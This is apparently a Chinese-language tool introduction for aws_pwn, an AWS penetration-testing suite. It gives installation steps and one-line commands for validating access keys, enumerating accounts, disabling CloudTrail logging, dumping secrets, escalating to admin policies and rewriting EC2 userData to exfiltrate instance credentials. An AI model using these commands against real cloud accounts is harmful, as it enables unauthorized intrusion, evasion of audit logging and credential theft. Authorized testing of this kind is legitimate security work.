![](https://image.3001.net/images/20230706/1688578685_64a5aa7dc08af0dd961cc.jpeg!small)  

## 关于aws_pwn

aws_pwn是一款功能强大的AWS渗透测试套件，该套件由多种工具脚本组成，可以帮助广大研究人员执行与AWS渗透测试相关的各种任务。

## 工具下载

由于该工具基于Python开发，因此我们首先需要在本地设备上安装并配置好Python环境。

接下来，广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/dagrz/aws_pwn.git

然后切换到项目目录中，使用pip命令和项目提供的requirements.txt文件安装该工具所需的依赖组件：

    
    
    cd aws_pwn
    
    pip install -r requirements.txt

最后，你还需要在~/.aws/credentials文件中配置你的 _AWS凭证信息_。

## 工具使用

### 网络侦查

validate_iam_access_keys.py这个脚本能够接收一个TSV文件（访问密钥）+敏感数据（+会话）组合作为输入参数，并能够检查访问有效性并返回主体的身份信息：

    
    
    ./validate_iam_access_keys.py -i /tmp/keys.txt -o /tmp/out.json

validate_s3_buckets.py脚本能够接收一个文本文件（每行一个单词）作为输入，并检测目标Bucket是否存在，然后返回基本标识信息：

    
    
    ./validate_s3_buckets.py -i /tmp/words.txt -o /tmp/out.json

validate_iam_principals.py脚本能够根据给定主体的文本文件（例如用户/admin，角色/deploy）来检查主体是否存在于给定帐户中：

    
    
    ./validate_iam_principals.py -a 123456789012 -i /tmp/words.txt -o /tmp/out.json

validate_accounts.py脚本可以根据给定一个包含帐户ID和帐户别名的文本文件来检查帐户是否存在：

    
    
    ./validate_accounts.py -i /tmp/accounts.txt -o /tmp/out.json

### 隐蔽行为

disrupt_cloudtrail.py脚本将尝试以指定方式中断/削弱cloudtrail日志记录：

    
    
    ./disrupt_cloudtrail.py -s

### 漏洞利用

dump_account_data.sh脚本能够调用一组基于帐户的通用read/list/get/descripte函数，并将数据保存到给定的位置：

    
    
    ./dump_account_data.sh /tmp/

### 权限提升

dump_instance_attributes.py脚本能够遍历帐户中的每个EC2实例并检索指定的实例属性。最常用于检索userData，其中往往包含敏感信息：

    
    
    ./dump_instance_attributes.py -u -o /tmp/

dump_cloudformation_stack_descriptions.py脚本可以检索每个现有堆栈和最近90天内删除的每个堆栈的堆栈说明。堆栈描述中的参数通常包含密码和其他敏感信息：

    
    
    ./dump_cloudformation_stack_descriptions.py -o /tmp/data

assume_roles.py脚本将尝试获取文件中或列表API提供的所有角色（ARN）：

    
    
    ./assume_roles.py -o /tmp/out.json

add_iam_policy.py脚本会将管理员和所有操作策略添加到给定的用户、角色或组，此时需要IAM putPolicy或attachPolicy权限：

    
    
    ./add_iam_policy.py -u myuser -r myrole -g mygroup

bouncy_bouncy_cloudy_cloud.py脚本能够跳出给定的EC2实例并重写其userData，以便运行任意代码或窃取临时实例配置文件凭据：

    
    
    ./bouncy_bouncy_cloudy_cloud.py -i instance-id -e exfiltration-endpoint

## 项目地址

 **aws_pwn** ：【[ _GitHub传送门_](https://github.com/dagrz/aws_pwn)】

